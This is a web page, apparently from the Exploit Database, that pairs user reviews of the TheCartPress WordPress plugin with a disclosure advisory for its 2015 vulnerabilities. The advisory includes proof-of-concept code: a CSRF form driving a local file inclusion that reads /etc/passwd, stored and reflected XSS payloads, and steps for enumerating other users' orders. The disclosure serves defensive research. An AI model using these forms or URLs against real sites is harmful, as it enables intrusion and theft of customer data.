This plugin has all the features I need. Unfortunately it is abandoned and not compatible with PHP 7.1.

no after payment support.
no replies to support or help.
does not work as advertised.
cannot obtain any after sales support or help.
now have to hire third party developer to iron-out problems with code.
code is messy.
the “company” that sells this plugin is a one-man-band company.
avoid.

I have been looking for a shop-like Wordpress plug-in to start a new project on Internet. I have tested a lot but just this one fits our necessities. Is quite powerful, well programmed, many options, secure. You can define almost every aspect of a shop with the advantage it is very configurable and easily customizable.
On the other hand, the support is outstanding. The author is always willing to help you out with any problem or bug you can find and solve it in a blink of an eye.
Every single plug-in, programs and other pieces of software are not bug-free. This is not an exception but the most important thing is that it is in constant development and improvement.
Thanks!

Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in TheCartPress WordPress plugin, which can be exploited to execute arbitrary PHP code, disclose sensitive data, and perform Cross-Site Scripting attacks against users of WordPress installations with the vulnerable plugin.

1) Local PHP File Inclusion in TheCartPress WordPress plugin: CVE-2015-3301

Input passed via the "tcp_box_path" HTTP POST parameter passed to "/wp-admin/admin.php?page=checkout_editor_settings" URL is not properly verified before being used in PHP 'include()' function, and can be abused to include arbitrary local files via directory traversal sequences.

In order to successfully exploit the vulnerability an attacker needs to have administrator privileges on WordPress installation, however this can be also exploited via CSRF vector to which the script is vulnerable as well.

Simple CSRF exploit below will execute the content of '/etc/passwd' file when a logged-in administrator will visit a page with it:

<form action="http://wordpress/wp-admin/admin.php?page=checkout_editor_settings" method="post" name="main">
<input type="hidden" name="tcp_save_fields"  value='1'>
<input type="hidden" name="tcp_box_path"  value='../../../../../etc/passwd'>
<input type="submit" id="btn">
</form>
<script>
 document.main.submit();
</script>

2) Stored XSS in TheCartPress WordPress plugin: CVE-2015-3300

During the checkout process, many user-supplied HTTP POST parameters (see complete list in PoC)in "Shipping address" and "Billing address" sections are not being sanitized before being stored in the local database.

Simple mass-XSS PoC against "Billing address" section (PoC against "Shipping address" scetion is identical, just replace 'billing_' prefix with 'shipping_') will write several JS pop-up alerts into the application database:

<form action="http://wordpress/shopping-cart/checkout/" method="post" name="main">
<input type="hidden" name="selected_billing_id"  value='1'>
<input type="hidden" name="selected_billing_address"  value='new'>
<input type="hidden" name="billing_firstname"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_lastname"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_company"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_tax_id_number"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_country_id"  value='AF'>
<input type="hidden" name="billing_region_id"  value=''>
<input type="hidden" name="billing_region"  value=''>
<input type="hidden" name="billing_city"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_street"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_street_2"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_postcode"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_telephone_1"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_telephone_2"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_fax"  value='"><script>alert(/immuniweb/);</script>'>
<input type="hidden" name="billing_email"  value='mail@mail.com'>
<input type="hidden" name="tcp_continue"  value=''>
<input type="hidden" name="tcp_step"  value='1'>
<input type="submit" id="btn">
</form>

A non-authenticated attacker may inject malicious HTML and JS code that will be stored in the application database, and available to any non-authenticated user on the following URL:

http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order

As well as on the following URL accessible to WordPress administrator only:

http://wordpress/wp-admin/admin.php?page=thecartpress/admin/OrdersListTable.php

3) Improper Access Control in TheCartPress WordPress plugin: CVE-2015-3302

Any non-authenticated user may browse orders of other users due to broken authentication mechanism. To reproduce the vulnerability an attacker shall first open the following URL:
http://wordpress/shopping-cart/checkout/?tcp_checkout=ok&order_id=[order_id]

And just after open the following URL to see full order details:
http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order

Moreover, the order ID can be easily predicted, as every new order ID is an incremented value of the previous one. This enables non-authenticated remote attacker to steal all currently-existing orders.

4) Multiple XSS in TheCartPress WordPress plugin (against administrator only): CVE-2015-3300

4.1 Input passed via the "search_by" GET parameter to "/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php&search_by=--%3E%%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E

4.2 Input passed via the "address_id", "address_name", "firstname", "lastname", "street", "city", "postcode", "email" GET parameters to "/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&address_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E

4.3 Input passed via the "post_id" and "rel_type" GET parameters to "/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php&post_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E

4.4 Input passed via the "post_type" GET parameter to "/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

http://wordpress/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php&post_type=1--%3E%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
